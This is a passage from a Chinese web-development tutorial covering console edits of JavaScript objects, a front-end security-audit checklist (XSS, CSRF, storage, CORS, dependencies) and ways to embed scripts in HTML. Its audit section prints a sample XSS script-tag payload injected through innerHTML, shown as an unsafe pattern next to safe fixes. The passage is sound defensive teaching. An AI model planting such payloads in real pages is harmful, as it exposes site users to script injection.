id="五、查看和修改-JavaScript-对象"><a href="#五、查看和修改-JavaScript-对象" class="headerlink" title="五、查看和修改 JavaScript 对象"></a>五、查看和修改 JavaScript 对象</h3><p>在控制台中可以查看 JavaScript 对象的详细信息，并动态修改对象的属性和方法。</p><h4 id="5-1-查看对象的结构"><a href="#5-1-查看对象的结构" class="headerlink" title="5.1 查看对象的结构"></a>5.1 查看对象的结构</h4><p>使用 <code>console.dir()</code> 来查看 JavaScript 对象的详细结构。</p><p><strong>步骤：</strong></p><ol><li>在控制台中使用 <code>console.dir()</code>。</li><li>通过点击展开查看对象的所有属性和方法。</li></ol><p><strong>示例：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">javascript复制代码<span class="hljs-keyword">let</span> person = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>, <span class="hljs-attr">job</span>: <span class="hljs-string">&#x27;Developer&#x27;</span> &#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">dir</span>(person);<br></code></pre></td></tr></table></figure><h4 id="5-2-修改对象属性"><a href="#5-2-修改对象属性" class="headerlink" title="5.2 修改对象属性"></a>5.2 修改对象属性</h4><p>你可以通过控制台直接修改对象的属性。</p><p><strong>步骤：</strong></p><ol><li>通过控制台访问对象并修改其属性。</li><li>查看修改后的效果。</li></ol><p><strong>示例：</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">javascript复制代码person.age = <span class="hljs-number">30</span>;<br>console.log(person);  // 输出 &#123;<span class="hljs-type">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>, age: <span class="hljs-number">30</span>, job: <span class="hljs-string">&#x27;Developer&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="六、临时修改网页中的-JavaScript-逻辑"><a href="#六、临时修改网页中的-JavaScript-逻辑" class="headerlink" title="六、临时修改网页中的 JavaScript 逻辑"></a>六、临时修改网页中的 JavaScript 逻辑</h3><p>如果你想要临时修改网页中的 JavaScript 逻辑，可以通过在控制台中添加新的代码块来实现。</p><h4 id="6-1-注入新的逻辑"><a href="#6-1-注入新的逻辑" class="headerlink" title="6.1 注入新的逻辑"></a>6.1 注入新的逻辑</h4><p>你可以动态注入一段新的 JavaScript 代码来改变网页的行为，测试特定功能或行为。</p><p><strong>示例：</strong></p><p>假设页面有一个提交按钮，你想在提交之前增加额外的检查，可以这样做：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript">javascript复制代码<span class="hljs-keyword">let</span> submitButton = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;#submitButton&#x27;</span>);<br>submitButton.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) &#123;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;#checkbox&#x27;</span>).<span class="hljs-property">checked</span>) &#123;<br>    event.<span class="hljs-title function_">preventDefault</span>();  <span class="hljs-comment">// 阻止提交</span><br>    <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;You must agree to the terms!&#x27;</span>);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>在控制台中，你可以动态修改 JavaScript 代码、DOM 元素、事件处理程序以及对象属性。这种修改只在当前页面加载周期内有效，刷新页面后会恢复为原始状态。控制台提供了极大的灵活性，可以帮助你调试、测试和临时修改网页行为，同时也可以用于开发过程中快速验证想法。</p><p>JavaScript 的安全性审计是确保应用程序不会因为 JavaScript 的漏洞或不当使用而遭受攻击的关键环节。Web 应用程序的安全性很大程度上依赖于前端 JavaScript 代码的安全性，因为它直接与用户交互，同时处理输入、发起请求，并控制页面逻辑。通过安全性审计，可以发现潜在的安全漏洞，如跨站脚本攻击（XSS）、跨站请求伪造（CSRF）、点击劫持、代码注入等。</p><p>在 JavaScript 安全性审计中，主要从<strong>输入验证、安全编码实践、库和依赖的审计、前端存储和网络请求安全性</strong>等方面进行。以下将详细讲述如何对 JavaScript 代码进行全面的安全性审计。</p><hr><h3 id="一、输入验证"><a href="#一、输入验证" class="headerlink" title="一、输入验证"></a>一、输入验证</h3><p>JavaScript 的输入验证是审计的首要环节，因为不可信的用户输入是攻击的最常见来源。前端的输入验证应被视为<strong>第一道防线</strong>，但不能依赖其完全阻止攻击，后端必须同样严格验证输入。前端的输入验证主要用于提升用户体验、减少不必要的请求。</p><h4 id="1-1-前端输入验证检查"><a href="#1-1-前端输入验证检查" class="headerlink" title="1.1 前端输入验证检查"></a>1.1 前端输入验证检查</h4><ol><li><p><strong>缺失或不当的验证逻辑：</strong></p><ul><li>确保所有输入数据，包括表单、URL 参数、AJAX 请求、用户交互的文件或图片等，都进行了初步的验证。</li><li>检查是否有输入长度限制、字符类型限制（如仅接受数字或字母）、必填项等。</li></ul></li><li><p><strong>防止脚本注入：</strong></p><ul><li>防止用户通过输入恶意脚本来进行代码注入（如 XSS 攻击）。特别是<code>&lt;script&gt;</code>标签或类似的代码应被严格过滤。</li></ul><p><strong>示例：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 不安全的处理方式：直接在页面中显示用户输入的内容</span><br><span class="hljs-keyword">let</span> userInput = <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;XSS Attack&#x27;);&lt;/script&gt;&quot;</span>;<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerHTML</span> = userInput;  <span class="hljs-comment">// XSS 攻击</span><br> <br><span class="hljs-comment">// 安全的做法：使用 textContent 插入纯文本，避免 XSS</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">textContent</span> = userInput;<br></code></pre></td></tr></table></figure></li><li><p><strong>使用正则表达式进行输入过滤：</strong></p><ul><li>使用正则表达式对输入进行有效性检查，但确保正则表达式足够安全，不会引发拒绝服务攻击（ReDoS），即恶意用户通过构造复杂输入触发正则表达式的性能问题，导致服务器响应过慢甚至崩溃。</li></ul><p><strong>示例：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">validateInput</span>(<span class="hljs-params">input</span>) &#123;<br>  <span class="hljs-keyword">const</span> regex = <span class="hljs-regexp">/^[a-zA-Z0-9]+$/</span>;  <span class="hljs-comment">// 仅允许字母和数字</span><br>  <span class="hljs-keyword">return</span> regex.<span class="hljs-title function_">test</span>(input);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>防止HTML实体注入：</strong></p><ul><li>不允许用户在输入中插入 HTML 标签、实体等。可以使用库对输入进行 HTML 实体编码或过滤（例如<code>DOMPurify</code>）。</li></ul></li></ol><hr><h3 id="二、跨站脚本攻击-XSS-防护"><a href="#二、跨站脚本攻击-XSS-防护" class="headerlink" title="二、跨站脚本攻击 (XSS) 防护"></a>二、跨站脚本攻击 (XSS) 防护</h3><p><strong>XSS</strong> 攻击是一种最常见的 Web 攻击类型，攻击者通过注入恶意 JavaScript 脚本，在其他用户的浏览器上执行。攻击者通常利用不安全的输入处理，将恶意代码注入到页面中，以窃取敏感信息（如 cookie、会话令牌）、劫持用户账户等。</p><h4 id="2-1-XSS-的类型"><a href="#2-1-XSS-的类型" class="headerlink" title="2.1 XSS 的类型"></a>2.1 XSS 的类型</h4><ol><li><p><strong>存储型 XSS</strong>：</p><ul><li>恶意脚本被存储在服务器端数据库中，每次当用户访问相关页面时，脚本会被执行。例如，攻击者通过留言板插入恶意脚本，当其他用户查看时，脚本执行。</li></ul></li><li><p><strong>反射型 XSS</strong>：</p><ul><li>恶意脚本被即时执行，通常嵌入在 URL 中。例如，通过欺骗用户点击一个恶意链接，该链接包含了攻击者的 JavaScript 代码，该代码会在用户浏览器中执行。</li></ul></li><li><p><strong>DOM 型 XSS</strong>：</p><ul><li>攻击者利用不安全的 JavaScript 操作来修改页面的 DOM 树，使恶意代码被注入并执行。这种攻击发生在客户端，无需与服务器交互。</li></ul></li></ol><h4 id="2-2-XSS-防护措施"><a href="#2-2-XSS-防护措施" class="headerlink" title="2.2 XSS 防护措施"></a>2.2 XSS 防护措施</h4><ol><li><p>**避免直接使用 <code>innerHTML</code> 或 <code>document.write()</code>**：</p><ul><li>避免直接将不可信的输入插入 DOM。应使用更安全的 <code>textContent</code> 或 <code>innerText</code>，将用户输入作为纯文本插入，而不是作为 HTML。</li></ul><p><strong>不安全的示例：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> userComment = <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;XSS&#x27;);&lt;/script&gt;&quot;</span>;<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerHTML</span> = userComment;  <span class="hljs-comment">// 可能导致XSS</span><br></code></pre></td></tr></table></figure><p><strong>安全的替代方式：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">textContent</span> = userComment;  <span class="hljs-comment">// 安全</span><br></code></pre></td></tr></table></figure></li><li><p><strong>使用可信的库进行转义</strong>：</p><ul><li>使用库如 <code>DOMPurify</code> 对用户生成的内容进行清理和过滤，确保在插入 DOM 时已经移除了可能的恶意代码。</li><li>对所有输入都进行 HTML 转义，避免特殊字符（如 <code>&lt;</code> 和 <code>&gt;</code>）被解释为 HTML 代码。</li></ul><p><strong>示例：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> sanitizedInput = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(userInput);<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerHTML</span> = sanitizedInput;<br></code></pre></td></tr></table></figure></li><li><p><strong>CSP（内容安全策略）</strong>：</p><ul><li>内容安全策略（CSP）是一种有效的 XSS 防护机制，它允许服务器指定浏览器只加载和执行来自可信源的 JavaScript 代码。通过设置严格的 CSP 头，可以防止页面加载和执行恶意脚本。</li></ul><p><strong>示例：</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Content-Security-Policy</span><span class="hljs-punctuation">: </span>default-src &#x27;self&#x27;; script-src &#x27;self&#x27;; style-src &#x27;self&#x27;;<br></code></pre></td></tr></table></figure></li></ol><hr><h3 id="三、跨站请求伪造-CSRF-防护"><a href="#三、跨站请求伪造-CSRF-防护" class="headerlink" title="三、跨站请求伪造 (CSRF) 防护"></a>三、跨站请求伪造 (CSRF) 防护</h3><p><strong>CSRF</strong> 是一种攻击手法，攻击者通过伪造受害者的身份，发送未经授权的请求。攻击的本质是利用了受害者的认证状态（如登录会话、Cookie），在未经用户同意的情况下，执行恶意操作。</p><h4 id="3-1-CSRF-攻击的防护措施"><a href="#3-1-CSRF-攻击的防护措施" class="headerlink" title="3.1 CSRF 攻击的防护措施"></a>3.1 CSRF 攻击的防护措施</h4><ol><li><p><strong>CSRF 令牌</strong>：</p><ul><li>每次用户发送请求时，服务器生成一个随机的 CSRF 令牌，并将其包含在表单或 AJAX 请求中。服务器验证该令牌的合法性，防止攻击者伪造请求。</li><li>在 JavaScript 中，确保请求时将 CSRF 令牌包含在请求的头部或表单中。</li></ul><p><strong>示例：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;/api/submit&quot;</span>, &#123;<br>  <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br>  <span class="hljs-attr">headers</span>: &#123;<br>    <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span>,<br>    <span class="hljs-string">&quot;CSRF-Token&quot;</span>: csrfToken  <span class="hljs-comment">// 包含CSRF令牌</span><br>  &#125;,<br>  <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; <span class="hljs-attr">data</span>: <span class="hljs-string">&quot;user data&quot;</span> &#125;)<br>&#125;);<br></code></pre></td></tr></table></figure></li><li><p><strong>双重 Cookie 防护</strong>：</p><ul><li>一种常见的策略是使用双重 Cookie：一个是标准的会话 Cookie，另一个是 HTTP 头中发送的 CSRF 令牌。这种方式可以确保请求必须来自合法的用户端。</li></ul></li></ol><hr><h3 id="四、前端存储的安全性"><a href="#四、前端存储的安全性" class="headerlink" title="四、前端存储的安全性"></a>四、前端存储的安全性</h3><p>Web 应用中前端存储的数据（如 <code>LocalStorage</code> 和 <code>SessionStorage</code>）也存在安全隐患，尤其是处理敏感数据时，需要特别小心。因为前端存储的数据是可以被浏览器中的任何脚本读取的。</p><h4 id="4-1-避免存储敏感数据"><a href="#4-1-避免存储敏感数据" class="headerlink" title="4.1 避免存储敏感数据"></a>4.1 避免存储敏感数据</h4><ol><li><p><strong>敏感数据不应存储在 LocalStorage 或 SessionStorage</strong>：</p><ul><li>不要将敏感信息（如用户的登录凭证、密码、令牌等）直接存储在 <code>LocalStorage</code> 或 <code>SessionStorage</code> 中，因为它们对 JavaScript 代码完全公开，任何脚本（包括 XSS）都可以访问这些存储数据。</li><li>如果需要使用会话令牌，应该存储在 Cookie 中，并使用 <code>HttpOnly</code> 和 <code>Secure</code> 标志，确保 JavaScript 无法访问，且只在 HTTPS 连接中传输。</li></ul></li><li><p><strong>加密存储</strong>：</p><ul><li>对存储的数据进行加密，即使攻击者能够读取存储的内容，也无法轻易解密这些信息。</li><li>但应注意，前端的加密密钥也不能存储在客户端代码中，因为这样会暴露给潜在的攻击者。</li></ul></li></ol><hr><h3 id="五、网络请求的安全性"><a href="#五、网络请求的安全性" class="headerlink" title="五、网络请求的安全性"></a>五、网络请求的安全性</h3><p>JavaScript 通常用于发起网络请求（如 AJAX、Fetch API 等），因此请求的安全性也是审计的重点。确保数据传输的安全，防止网络层面上的攻击。</p><h4 id="5-1-HTTPS-加密通信"><a href="#5-1-HTTPS-加密通信" class="headerlink" title="5.1 HTTPS 加密通信"></a>5.1 HTTPS 加密通信</h4><ol><li><p><strong>确保所有请求都通过 HTTPS 进行传输</strong>：</p><ul><li>通过 HTTPS 可以确保数据在客户端和服务器之间的传输是加密的，防止中间人攻击（MITM）。</li><li>在 JavaScript 中，确保请求的 URL 都是 HTTPS 地址，而不是 HTTP。</li></ul></li><li><p>**验证服务器</p></li></ol><p>的 SSL 证书**：</p><ul><li>如果网站没有正确配置 SSL 证书，浏览器会提醒用户连接不安全，导致信任问题。应确保服务器配置了有效的 SSL 证书，且不会过期。</li></ul><h4 id="5-2-防止-API-滥用和-CSRF"><a href="#5-2-防止-API-滥用和-CSRF" class="headerlink" title="5.2 防止 API 滥用和 CSRF"></a>5.2 防止 API 滥用和 CSRF</h4><ol><li><p><strong>使用适当的身份验证和授权机制</strong>：</p><ul><li>通过令牌（如 JWT 或 OAuth）进行身份验证，并确保每个请求都带有合法的身份验证令牌。</li></ul></li><li><p><strong>限制请求来源</strong>：</p><ul><li>使用 CORS（跨域资源共享）头，指定哪些域名可以合法访问 API。确保服务器只接受来自可信域的请求，防止恶意网站滥用 API。</li></ul><p><strong>示例：</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Access-Control-Allow-Origin</span><span class="hljs-punctuation">: </span>https://trusted-domain.com;<br></code></pre></td></tr></table></figure></li></ol><hr><h3 id="六、依赖和第三方库的安全性"><a href="#六、依赖和第三方库的安全性" class="headerlink" title="六、依赖和第三方库的安全性"></a>六、依赖和第三方库的安全性</h3><p>JavaScript 项目中使用第三方库时，必须确保这些库是安全的，因为它们可能包含漏洞或恶意代码。</p><h4 id="6-1-审查和更新依赖库"><a href="#6-1-审查和更新依赖库" class="headerlink" title="6.1 审查和更新依赖库"></a>6.1 审查和更新依赖库</h4><ol><li><p><strong>定期更新第三方库</strong>：</p><ul><li>使用 <code>npm audit</code> 或类似工具，定期检查项目中是否存在安全漏洞。更新到最新的稳定版本，以修补已知的安全问题。</li></ul><p><strong>示例：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm audit fix<br></code></pre></td></tr></table></figure></li><li><p><strong>使用受信任的库源</strong>：</p><ul><li>只从可信赖的源下载和安装库。避免使用来源不明的库，防止供应链攻击（供应链攻击是指攻击者通过修改合法软件包的代码来传播恶意软件）。</li></ul></li><li><p><strong>移除未使用的依赖</strong>：</p><ul><li>不使用的库和代码可能成为潜在的安全隐患。定期清理项目，确保只保留必要的依赖项。</li></ul></li></ol><hr><h3 id="七、前端代码的混淆与保护"><a href="#七、前端代码的混淆与保护" class="headerlink" title="七、前端代码的混淆与保护"></a>七、前端代码的混淆与保护</h3><p>前端代码是完全公开的，任何用户都可以查看源码。因此，在某些敏感应用场景下，应考虑对前端 JavaScript 代码进行混淆，增加反向工程的难度。</p><h4 id="7-1-代码混淆和压缩"><a href="#7-1-代码混淆和压缩" class="headerlink" title="7.1 代码混淆和压缩"></a>7.1 代码混淆和压缩</h4><ol><li><p><strong>使用工具混淆代码</strong>：</p><ul><li>使用工具如 UglifyJS 或 Terser 来压缩和混淆 JavaScript 代码，使其难以被理解。这可以防止一些低水平的攻击者直接查看代码逻辑。</li></ul></li><li><p><strong>谨慎使用敏感数据</strong>：</p><ul><li>即便进行了混淆，敏感逻辑或数据仍然不应该放置在前端代码中。应确保所有敏感逻辑尽可能放置在后端服务器上执行。</li></ul></li></ol><hr><p>将 JavaScript 嵌入 HTML 有多种方式，每种方式都适用于不同的场景，具体的选择取决于代码的大小、复用需求以及性能优化的考虑。以下是将 JavaScript 嵌入 HTML 的几种主要方式，以及它们的用法和适用场景。</p><h3 id="1-内联-JavaScript"><a href="#1-内联-JavaScript" class="headerlink" title="1. 内联 JavaScript"></a>1. <strong>内联 JavaScript</strong></h3><p>内联 JavaScript 是将 JavaScript 代码直接嵌入到 HTML 标签的 <code>script</code> 元素中。这种方法简单直观，适用于少量的脚本代码。</p><h4 id="用法："><a href="#用法：" class="headerlink" title="用法："></a>用法：</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Inline JavaScript Example<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, World!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-comment">// 这是内联 JavaScript 代码</span></span><br><span class="language-javascript">        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;This is an inline JavaScript script.&#x27;</span>);</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="适用场景："><a href="#适用场景：" class="headerlink" title="适用场景："></a>适用场景：</h4><ul><li>当 JavaScript 代码量较少时，例如一个简单的交互。</li><li>临时或快速测试小功能的场景。</li></ul><h4 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h4><ul><li><strong>可维护性差</strong>：如果代码量较大，内联代码会使 HTML 文件难以维护和阅读。</li><li><strong>安全性问题</strong>：由于代码直接嵌入到 HTML 中，容易受到跨站脚本攻击（XSS）。应该谨慎使用，避免直接插入用户输入数据。</li></ul><hr><h3 id="2-外部-JavaScript-文件"><a href="#2-外部-JavaScript-文件" class="headerlink" title="2. 外部 JavaScript 文件"></a>2. <strong>外部 JavaScript 文件</strong></h3><p>外部 JavaScript 是将 JavaScript 代码放在单独的文件中，并通过 <code>&lt;script&gt;</code> 标签引入。这种方式有利于代码的复用、管理和维护。</p><h4 id="用法：-1"><a href="#用法：-1" class="headerlink" title="用法："></a>用法：</h4><p>首先，创建一个外部 JavaScript 文件，如 <code>script.js</code>，并编写代码：</p><p><strong><code>script.js</code> 文件：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 这是一个外部 JavaScript 文件</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;This script is from an external JavaScript file.&#x27;</span>);<br></code></pre></td></tr></table></figure><p>然后，在 HTML 中引入该外部文件：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>External JavaScript Example<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 引入外部 JavaScript 文件 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;script.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, External Script!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="适用场景：-1"><a href="#适用场景：-1" class="headerlink" title="适用场景："></a>适用场景：</h4><ul><li>当 JavaScript 代码量较大时，或需要多个页面共享相同的 JavaScript 代码时。</li><li>外部文件更易于版本控制、团队协作和性能优化（例如浏览器缓存 JavaScript 文件）。</li></ul><h4 id="注意事项：-1"><a href="#注意事项：-1" class="headerlink" title="注意事项："></a>注意事项：</h4><ul><li><strong>文件加载顺序</strong>：外部脚本在默认情况下是同步加载的，这意味着 HTML 的解析会等待 JavaScript 文件的加载和执行完成。在大文件或网络较慢时，这会影响页面加载速度。可以通过 <code>async</code> 或 <code>defer</code> 属性来优化加载。</li></ul><hr><h3 id="3-异步与延迟加载-JavaScript（async-和-defer）"><a href="#3-异步与延迟加载-JavaScript（async-和-defer）" class="headerlink" title="3. 异步与延迟加载 JavaScript（async 和 defer）"></a>3. <strong>异步与延迟加载 JavaScript（async 和 defer）</strong></h3><p>为了优化页面加载性能，外部 JavaScript 文件可以使用 <code>async</code> 或 <code>defer</code> 属性，这两个属性控制脚本的加载和执行时机。</p><h4 id="3-1-async-属性"><a href="#3-1-async-属性" class="headerlink" title="3.1 async 属性"></a>3.1 <code>async</code> 属性</h4><p><code>async</code> 会让脚本文件异步加载，加载完成后立即执行。这意味着脚本的执行顺序可能与 HTML 的加载顺序不一致。</p><h4 id="用法：-2"><a href="#用法：-2" class="headerlink" title="用法："></a>用法：</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;script.js&quot;</span> <span class="hljs-attr">async</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h4><ul><li>脚本与 HTML 并行加载，且脚本在加载完后立即执行。</li><li>适用于不会依赖 DOM 的独立脚本，比如分析工具、广告代码等。</li></ul><h4 id="3-2-defer-属性"><a href="#3-2-defer-属性" class="headerlink" title="3.2 defer 属性"></a>3.2 <code>defer</code> 属性</h4><p><code>defer</code> 属性也让脚本文件异步加载，但它保证脚本在 HTML 文档完全解析后才会执行，且按顺序执行。</p><h4 id="用法：-3"><a href="#用法：-3" class="headerlink" title="用法："></a>用法：</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;script.js&quot;</span> <span class="hljs-attr">defer</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="特点：-1"><a href="#特点：-1" class="headerlink" title="特点："></a>特点：</h4><ul><li><code>defer</code> 保证脚本按顺序执行，且不会阻塞 HTML 的解析。</li><li>适用于依赖 DOM 的 JavaScript 文件。</li></ul><h4 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span 